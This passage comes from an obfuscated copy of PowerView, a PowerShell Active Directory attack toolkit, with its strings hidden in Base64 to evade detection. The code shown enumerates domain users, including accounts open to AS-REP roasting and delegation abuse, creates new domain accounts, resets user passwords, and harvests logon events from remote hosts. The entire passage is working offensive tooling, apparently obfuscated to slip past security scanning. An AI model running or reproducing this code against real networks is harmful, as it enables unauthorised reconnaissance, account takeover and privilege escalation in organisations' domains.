QAaQB2AGUAIABhAG4AZAAgAG4AbwB0ACAAdAByAHUAcwB0AGUAZAAgAGYAbwByACAAZA
BlAGwAZQBnAGEAdABpAG8AbgA=')))
                $Filter += 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOA
A0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADEAMAA0ADgANQA3AD
QAKQA=')))
            }
            if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QQBkAG0AaQBuAEMAbwB1AG4AdAA=')))]) {
                Write-Verbose 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFMAZQBhAHIAYwBoAGkAbg
BnACAAZgBvAHIAIABhAGQAbQBpAG4AQwBvAHUAbgB0AD0AMQA=')))
               
 $Filter += $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('KABhAGQAbQBpAG4AYwBvAHUAbgB0AD0AMQApAA==')))
            }
          
  if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('VAByAHUAcwB0AGUAZABUAG8AQQB1AHQAaAA=')))]) {
                
Write-Verbose $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFMAZQBhAHIAYwBoAGkAbg
BnACAAZgBvAHIAIAB1AHMAZQByAHMAIAB0AGgAYQB0ACAAYQByAGUAIAB0AHIAdQBzAH
QAZQBkACAAdABvACAAYQB1AHQAaABlAG4AdABpAGMAYQB0AGUAIABmAG8AcgAgAG8AdA
BoAGUAcgAgAHAAcgBpAG4AYwBpAHAAYQBsAHMA')))
                $Filter += 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABtAHMAZABzAC0AYQBsAGwAbwB3AGUAZAB0AG8AZABlAGwAZQBnAGEAdABlAHQAbw
A9ACoAKQA=')))
            }
            if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAGUAYQB1AHQAaABOAG8AdABSAGUAcQB1AGkAcgBlAGQA')))]) {
           
     Write-Verbose $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFMAZQBhAHIAYwBoAGkAbg
BnACAAZgBvAHIAIAB1AHMAZQByACAAYQBjAGMAbwB1AG4AdABzACAAdABoAGEAdAAgAG
QAbwAgAG4AbwB0ACAAcgBlAHEAdQBpAHIAZQAgAGsAZQByAGIAZQByAG8AcwAgAHAAcg
BlAGEAdQB0AGgAZQBuAHQAaQBjAGEAdABlAA==')))
                $Filter += 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOA
A0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADQAMQA5ADQAMwAwAD
QAKQA=')))
            }
            if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFUAcwBpAG4AZwAgAGEAZA
BkAGkAdABpAG8AbgBhAGwAIABMAEQAQQBQACAAZgBpAGwAdABlAHIAOgAgACQATABEAE
EAUABGAGkAbAB0AGUAcgA=')))
                $Filter += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
            }
            
$UACFilter | Where-Object {$_} | ForEach-Object {
                if 
($_ -match $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TgBPAFQAXwAuACoA')))) {
                
    ${94bc4eae246742248efd06d55f760378} = $_.Substring(4)
            
        ${31f162691d5f4e939decf3286c312d49} = [Int]
(${9ad57110e7184c649f993e0b08059b53}::
${94bc4eae246742248efd06d55f760378})
                    $Filter += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAAhACgAdQBzAGUAcgBBAGMAYwBvAHUAbgB0AEMAbwBuAHQAcgBvAGwAOgAxAC4AMg
AuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQAkAHsAMwAxAG
YAMQA2ADIANgA5ADEAZAA1AGYANABlADkAMwA5AGQAZQBjAGYAMwAyADgANgBjADMAMQ
AyAGQANAA5AH0AKQApAA==')))
                }
                else {
    
                ${31f162691d5f4e939decf3286c312d49} = [Int]
(${9ad57110e7184c649f993e0b08059b53}::$_)
                    $Filter 
+= $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOA
A0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ACQAewAzADEAZgAxAD
YAMgA2ADkAMQBkADUAZgA0AGUAOQAzADkAZABlAGMAZgAzADIAOAA2AGMAMwAxADIAZA
A0ADkAfQApAA==')))
                }
            }
            
${27dc86b883bb446681492564ecbdd4a0}.filter = 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAAmACgAcwBhAG0AQQBjAGMAbwB1AG4AdABUAHkAcABlAD0AOAAwADUAMwAwADYAMw
A2ADgAKQAkAEYAaQBsAHQAZQByACkA')))
            Write-Verbose "[Get-
DomainUser] filter string: 
$(${27dc86b883bb446681492564ecbdd4a0}.filter)"
            if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { 
${9f78951ba80c437e9db41515f07bc24e} = 
${27dc86b883bb446681492564ecbdd4a0}.FindOne() }
            else { 
${9f78951ba80c437e9db41515f07bc24e} = 
${27dc86b883bb446681492564ecbdd4a0}.FindAll() }
            
${9f78951ba80c437e9db41515f07bc24e} | Where-Object {$_} | ForEach-
Object {
                if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBhAHcA')))]) {
                    $User = $_
                    
$User.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBVAHMAZQByAC4AUgBhAHcA'))))
              
  }
                else {
                    $User = Convert-
LDAPProperty -Properties $_.Properties
                    
$User.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBVAHMAZQByAA=='))))
                }
     
           $User
            }
            if 
(${9f78951ba80c437e9db41515f07bc24e}) {
                try { 
${9f78951ba80c437e9db41515f07bc24e}.dispose() }
                catch 
{
                    Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAEUAcgByAG8AcgAgAGQAaQ
BzAHAAbwBzAGkAbgBnACAAbwBmACAAdABoAGUAIABSAGUAcwB1AGwAdABzACAAbwBiAG
oAZQBjAHQAOgAgACQAXwA=')))
                }
            }
            
${27dc86b883bb446681492564ecbdd4a0}.dispose()
        }
    }
}
function 
New-DomainUser {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSUseShouldProcessForStateChangingFunctions', '')]
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType
('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
     
   [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
    
    [String]
        $SamAccountName,
        [Parameter(Mandatory = 
$True)]
        [ValidateNotNullOrEmpty()]
        [Alias
('Password')]
        [Security.SecureString]
        
$AccountPassword,
        [ValidateNotNullOrEmpty()]
        [String]
  
      $Name,
        [ValidateNotNullOrEmpty()]
        [String]
       
 $DisplayName,
        [ValidateNotNullOrEmpty()]
        [String]
     
   $Description,
        [ValidateNotNullOrEmpty()]
        [String]
   
     $Domain,
        [Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    
${432399043cb74015939f7ede4d948e76} = @{
        'Identity' = 
$SamAccountName
    }
    if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))]) { ${432399043cb74015939f7ede4d948e76}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
    if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${432399043cb74015939f7ede4d948e76}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    
${a2937286b06c4978969ea53dafc8c4d6} = Get-PrincipalContext 
@432399043cb74015939f7ede4d948e76
    if 
(${a2937286b06c4978969ea53dafc8c4d6}) {
        $User = New-Object -
TypeName System.DirectoryServices.AccountManagement.UserPrincipal -
ArgumentList (${a2937286b06c4978969ea53dafc8c4d6}.Context)
        
$User.SamAccountName = ${a2937286b06c4978969ea53dafc8c4d6}.Identity
  
      ${3eddea83c65747c4a6e26eaeee149e83} = New-Object 
System.Management.Automation.PSCredential('a', $AccountPassword)
     
   $User.SetPassword
(${3eddea83c65747c4a6e26eaeee149e83}.GetNetworkCredential
().Password)
        $User.Enabled = $True
        
$User.PasswordNotRequired = $False
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TgBhAG0AZQA=')))]) {
            $User.Name = $Name
        }
        
else {
            $User.Name = 
${a2937286b06c4978969ea53dafc8c4d6}.Identity
        }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABpAHMAcABsAGEAeQBOAGEAbQBlAA==')))]) 
{
            $User.DisplayName = $DisplayName
        }
        else 
{
            $User.DisplayName = 
${a2937286b06c4978969ea53dafc8c4d6}.Identity
        }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA==')))]) 
{
            $User.Description = $Description
        }
        
Write-Verbose $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBOAGUAdwAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAEEAdAB0AGUAbQBwAHQAaQ
BuAGcAIAB0AG8AIABjAHIAZQBhAHQAZQAgAHUAcwBlAHIAIAAnACQAUwBhAG0AQQBjAG
MAbwB1AG4AdABOAGEAbQBlACcA')))
        try {
            $Null = 
$User.Save()
            Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBOAGUAdwAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFUAcwBlAHIAIAAnACQAUw
BhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlACcAIABzAHUAYwBjAGUAcwBzAGYAdQBsAG
wAeQAgAGMAcgBlAGEAdABlAGQA')))
            $User
        }
        
catch {
            Write-Warning 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBOAGUAdwAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAEUAcgByAG8AcgAgAGMAcg
BlAGEAdABpAG4AZwAgAHUAcwBlAHIAIAAnACQAUwBhAG0AQQBjAGMAbwB1AG4AdABOAG
EAbQBlACcAIAA6ACAAJABfAA==')))
        }
    }
}
function Set-
DomainUserPassword {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSUseShouldProcessForStateChangingFunctions', '')]
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType
('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
     
   [Parameter(Position = 0, Mandatory = $True)]
        [Alias
('UserName', 'UserIdentity', 'User')]
        [String]
        
$Identity,
        [Parameter(Mandatory = $True)]
        
[ValidateNotNullOrEmpty()]
        [Alias('Password')]
        
[Security.SecureString]
        $AccountPassword,
        
[ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    
${432399043cb74015939f7ede4d948e76} = @{ 'Identity' = $Identity }
    
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { 
${432399043cb74015939f7ede4d948e76}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
    if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${432399043cb74015939f7ede4d948e76}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    
${a2937286b06c4978969ea53dafc8c4d6} = Get-PrincipalContext 
@432399043cb74015939f7ede4d948e76
    if 
(${a2937286b06c4978969ea53dafc8c4d6}) {
        $User = 
[System.DirectoryServices.AccountManagement.UserPrincipal]::FindById
entity(${a2937286b06c4978969ea53dafc8c4d6}.Context, $Identity)
       
 if ($User) {
            Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBTAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAUABhAHMAcwB3AG8AcgBkAF0AIA
BBAHQAdABlAG0AcAB0AGkAbgBnACAAdABvACAAcwBlAHQAIAB0AGgAZQAgAHAAYQBzAH
MAdwBvAHIAZAAgAGYAbwByACAAdQBzAGUAcgAgACcAJABJAGQAZQBuAHQAaQB0AHkAJw
A=')))
            try {
                
${3eddea83c65747c4a6e26eaeee149e83} = New-Object 
System.Management.Automation.PSCredential('a', $AccountPassword)
     
           $User.SetPassword
(${3eddea83c65747c4a6e26eaeee149e83}.GetNetworkCredential
().Password)
                $Null = $User.Save()
                
Write-Verbose $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBTAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAUABhAHMAcwB3AG8AcgBkAF0AIA
BQAGEAcwBzAHcAbwByAGQAIABmAG8AcgAgAHUAcwBlAHIAIAAnACQASQBkAGUAbgB0AG
kAdAB5ACcAIABzAHUAYwBjAGUAcwBzAGYAdQBsAGwAeQAgAHIAZQBzAGUAdAA=')))
   
         }
            catch {
                Write-Warning 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBTAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAUABhAHMAcwB3AG8AcgBkAF0AIA
BFAHIAcgBvAHIAIABzAGUAdAB0AGkAbgBnACAAcABhAHMAcwB3AG8AcgBkACAAZgBvAH
IAIAB1AHMAZQByACAAJwAkAEkAZABlAG4AdABpAHQAeQAnACAAOgAgACQAXwA=')))
   
         }
        }
        else {
            Write-Warning 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBTAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAUABhAHMAcwB3AG8AcgBkAF0AIA
BVAG4AYQBiAGwAZQAgAHQAbwAgAGYAaQBuAGQAIAB1AHMAZQByACAAJwAkAEkAZABlAG
4AdABpAHQAeQAnAA==')))
        }
    }
}
function Get-DomainUserEvent {
  
  [Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType('PowerView.LogonEvent')]
    
[OutputType('PowerView.ExplicitCredentialLogonEvent')]
    
[CmdletBinding()]
    Param(
        [Parameter(Position = 0, 
ValueFromPipeline = $True, ValueFromPipelineByPropertyName = 
$True)]
        [Alias('dnshostname', 'HostName', 'name')]
        
[ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 
$Env:COMPUTERNAME,
        [ValidateNotNullOrEmpty()]
        
[DateTime]
        $StartTime = [DateTime]::Now.AddDays(-1),
        
[ValidateNotNullOrEmpty()]
        [DateTime]
        $EndTime = 
[DateTime]::Now,
        [ValidateRange(1, 1000000)]
        [Int]
     
   $MaxEvents = 5000,
        [Management.Automation.PSCredential]
    
    [Management.Automation.CredentialAttribute()]
        $Credential 
= [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        
${2fa724edb11145219f71c42ce3eb4cf7} = @"
<QueryList>
    <Query Id="0" 
Path="Security">

        <!-- Logon events -->
        <Select 
Path="Security">
            *[
                System[
                
    Provider[
                        @Name='Microsoft-Windows-
Security-Auditing'
                    ]
                    and 
(Level=4 or Level=0) and (EventID=4624)
                    and 
TimeCreated[
                        
@SystemTime&gt;='$($StartTime.ToUniversalTime().ToString('s'))' and 
@SystemTime&lt;='$($EndTime.ToUniversalTime().ToString('s'))'
        
            ]
                ]
            ]
            and
           
 *[EventData[Data[@Name='TargetUserName'] != 'ANONYMOUS LOGON']]
     
   </Select>

        <!-- Logon with explicit credential events -->
   
     <Select Path="Security">
            *[
                System[
   
                 Provider[
                        @Name='Microsoft-
Windows-Security-Auditing'
                    ]
                    
and (Level=4 or Level=0) and (EventID=4648)
                    and 
TimeCreated[
                        
@SystemTime&gt;='$($StartTime.ToUniversalTime().ToString('s'))' and 
@SystemTime&lt;='$($EndTime.ToUniversalTime().ToString('s'))'
        
            ]
                ]
            ]
        </Select>

        
<Suppress Path="Security">
            *[
                System[
      
              Provider[
                        @Name='Microsoft-
Windows-Security-Auditing'
                    ]
                    
and
                    (Level=4 or Level=0) and (EventID=4624 or 
EventID=4625 or EventID=4634)
                ]
            ]
          
  and
            *[
                EventData[
                    (
   
                     (Data[@Name='LogonType']='5' or Data
[@Name='LogonType']='0')
                        or
                   
     Data[@Name='TargetUserName']='ANONYMOUS LOGON'
                  
      or
                        Data[@Name='TargetUserSID']='S-1-5-
18'
                    )
                ]
            ]
        
</Suppress>
    </Query>
</QueryList>
"@
        
${03342486c5a64fbb9519213b774d135e} = @{
            'FilterXPath' = 
${2fa724edb11145219f71c42ce3eb4cf7}
            'LogName' = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGMAdQByAGkAdAB5AA==')))
            'MaxEvents' = $MaxEvents
   
     }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${03342486c5a64fbb9519213b774d135e}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS 
{
        ForEach (${9c0baec859734fc983ee3c04b4cde8a7} in 
$ComputerName) {
            ${03342486c5a64fbb9519213b774d135e}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))] = 
${9c0baec859734fc983ee3c04b4cde8a7}
            Get-WinEvent 
@03342486c5a64fbb9519213b774d135e| ForEach-Object {
                
${c375549cf83745a38740aa99594e9564} = $_
                $Properties 
= ${c375549cf83745a38740aa99594e9564}.Properties
                
Switch (${c375549cf83745a38740aa99594e9564}.Id) {
                    
4624 {
                        if(-not $Properties[5].Value.EndsWith
('$')) {
                            
${5cfffc0ad0f94214bae0585e8079600f} = New-Object PSObject -Property 
@{
                                ComputerName              = 
${9c0baec859734fc983ee3c04b4cde8a7}
                                
TimeCreated               = 
${c375549cf83745a38740aa99594e9564}.TimeCreated
                      
          EventId                   = 
${c375549cf83745a38740aa99594e9564}.Id
                               
 SubjectUserSid            = $Properties[0].Value.ToString()
         
                       SubjectUserName           = $Properties
[1].Value
                                SubjectDomainName         = 
$Properties[2].Value
                                SubjectLogonId   
         = $Properties[3].Value
                                
TargetUserSid             = $Properties[4].Value.ToString()
          
                      TargetUserName            = $Properties
[5].Value
                                TargetDomainName          = 
$Properties[6].Value
                                TargetLogonId    
         = $Properties[7].Value
                                
LogonType                 = $Properties[8].Value
                     
           LogonProcessName          = $Properties[9].Value
          
                      AuthenticationPackageName = $Properties
[10].Value
                                WorkstationName           
= $Properties[11].Value
                                LogonGuid     
            = $Properties[12].Value
                                
TransmittedServices       = $Properties[13].Value
                    
            LmPackageName             = $Properties[14].Value
        
                        KeyLength                 = $Properties
[15].Value
                                ProcessId                 
= $Properties[16].Value
                                ProcessName   
            = $Properties[17].Value
                                
IpAddress                 = $Properties[18].Value
                    
            IpPort                    = $Properties[19].Value
        
                        ImpersonationLevel        = $Properties
[20].Value
                                RestrictedAdminMode       
= $Properties[21].Value
                                
TargetOutboundUserName    = $Properties[22].Value
                    
            TargetOutboundDomainName  = $Properties[23].Value
        
                        VirtualAccount            = $Properties
[24].Value
                                TargetLinkedLogonId       
= $Properties[25].Value
                                ElevatedToken 
            = $Properties[26].Value
                            }
     
                       
${5cfffc0ad0f94214bae0585e8079600f}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBMAG8AZwBvAG4ARQB2AGUAbgB0AA=='))))
      
                      ${5cfffc0ad0f94214bae0585e8079600f}
            
            }
                    }
                    4648 {
         
               if((-not $Properties[5].Value.EndsWith('$')) -and 
($Properties[11].Value -match $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('dABhAHMAawBoAG8AcwB0AFwALgBlAHgAZQA='))))) {
                       
     ${5cfffc0ad0f94214bae0585e8079600f} = New-Object PSObject -
Property @{
                                ComputerName              
= ${9c0baec859734fc983ee3c04b4cde8a7}
                                
TimeCreated       = ${c375549cf83745a38740aa99594e9564}.TimeCreated
  
                              EventId           = 
${c375549cf83745a38740aa99594e9564}.Id
                               
 SubjectUserSid    = $Properties[0].Value.ToString()
                 
               SubjectUserName   = $Properties[1].Value
              
                  SubjectDomainName = $Properties[2].Value
           
                     SubjectLogonId    = $Properties[3].Value
        
                        LogonGuid         = $Properties
[4].Value.ToString()
                                TargetUserName   
 = $Properties[5].Value
                                
TargetDomainName  = $Properties[6].Value
                             
   TargetLogonGuid   = $Properties[7].Value
                          
      TargetServerName  = $Properties[8].Value
                       
         TargetInfo        = $Properties[9].Value
                    
            ProcessId         = $Properties[10].Value
                
                ProcessName       = $Properties[11].Value
            
                    IpAddress         = $Properties[12].Value
        
                        IpPort            = $Properties[13].Value
    
                        }
                            
${5cfffc0ad0f94214bae0585e8079600f}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBFAHgAcABsAGkAYwBpAHQAQwByAGUAZABlAG4AdA
BpAGEAbABMAG8AZwBvAG4ARQB2AGUAbgB0AA=='))))
                          
  ${5cfffc0ad0f94214bae0585e8079600f}
                        }
       
             }
                    default {
                        
Write-Warning "No handler exists for event ID: 
$(${c375549cf83745a38740aa99594e9564}.Id)"
                    }
      
          }
            }
        }
    }
}
function Get-DomainGUIDMap {
  
  [Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    
[CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
       
 [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        
[Alias('DomainController')]
        [String]
        $Server,
        
[ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 
200,
        [ValidateRange(1, 10000)]
        [Int]
        
$ServerTimeLimit,
        [Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    
${ca3d4121ac6f47a0a0442dc1d46ba182} = @{'00000000-0000-0000-0000-
000000000000' = $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QQBsAGwA')))}
    
${667525c94486419f864ec27e01fc6e65} = @{}
    if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${667525c94486419f864ec27e01fc6e65}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    try {
        
${cc2f4722662c4c888c3d64686cfec76d} = (Get-Forest 
@667525c94486419f864ec27e01fc6e65).schema.name
    }
    catch {
       
 throw $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAVQBJAEQATQBhAHAAXQAgAEUAcgByAG8Acg
AgAGkAbgAgAHIAZQB0AHIAaQBlAHYAaQBuAGcAIABmAG8AcgBlAHMAdAAgAHMAYwBoAG
UAbQBhACAAcABhAHQAaAAgAGYAcgBvAG0AIABHAGUAdAAtAEYAbwByAGUAcwB0AA==')
))
    }
    if (-not ${cc2f4722662c4c888c3d64686cfec76d}) {
        
throw $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAVQBJAEQATQBhAHAAXQAgAEUAcgByAG8Acg
AgAGkAbgAgAHIAZQB0AHIAaQBlAHYAaQBuAGcAIABmAG8AcgBlAHMAdAAgAHMAYwBoAG
UAbQBhACAAcABhAHQAaAAgAGYAcgBvAG0AIABHAGUAdAAtAEYAbwByAGUAcwB0AA==')
))
    }
    ${ea43c787582f45539b7f519da4680c7a} = @{
        
'SearchBase' = ${cc2f4722662c4c888c3d64686cfec76d}
        
'LDAPFilter' = $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('KABzAGMAaABlAG0AYQBJAEQARwBVAEkARAA9ACoAKQA=')))
    }
    if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
    if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))]) { ${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
    if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
  if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    
${7abc25f799714e17a076d995ffd5febc} = Get-DomainSearcher 
@ea43c787582f45539b7f519da4680c7a
    if 
(${7abc25f799714e17a076d995ffd5febc}) {
        try {
            
${9f78951ba80c437e9db41515f07bc24e} = 
${7abc25f799714e17a076d995ffd5febc}.FindAll()
            
${9f78951ba80c437e9db41515f07bc24e} | Where-Object {$_} | ForEach-
Object {
                ${ca3d4121ac6f47a0a0442dc1d46ba182}[(New-
Object Guid (,$_.properties.schemaidguid[0])).Guid] = 
$_.properties.name[0]
            }
            if 
(${9f78951ba80c437e9db41515f07bc24e}) {
                try { 
${9f78951ba80c437e9db41515f07bc24e}.dispose() }
                catch 
{
                    Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAVQBJAEQATQBhAHAAXQAgAEUAcgByAG8Acg
AgAGQAaQBzAHAAbwBzAGkAbgBnACAAbwBmACAAdABoAGUAIABSAGUAcwB1AGwAdABzAC
AAbwBiAGoAZQBjAHQAOgAgACQAXwA=')))
                }
            }
     
       ${7abc25f799714e17a076d995ffd5febc}.dispose()
        }
        
catch {
            Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
